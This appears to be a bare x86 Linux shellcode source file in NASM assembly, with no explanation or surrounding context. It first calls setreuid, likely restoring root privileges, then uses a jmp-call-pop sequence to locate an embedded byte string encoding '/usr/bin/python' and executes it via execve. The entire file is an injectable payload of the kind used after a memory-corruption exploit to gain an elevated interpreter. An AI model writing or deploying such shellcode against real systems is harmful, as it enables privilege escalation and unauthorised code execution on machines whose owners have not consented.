global _start

section .text

_start:
	push byte 70
	pop eax
	int 0x80
	jmp short shellcode

test:
	pop ebx
	xor eax,eax
		
	mov [ebx+0x10], ebx
	mov [ebx+0x14],eax
	
	mov al, 0xa
	lea ecx,[ebx+0x10]
	lea edx,[ebx+0x14]
	inc al
	int 0x80
 
shellcode:
	call test
	shellcoded: db 0x2f,0x75,0x73,0x72,0x2f,0x62,0x69,0x6e,0x2f,0x70,0x79,0x74,0x68,0x6f,0x6e
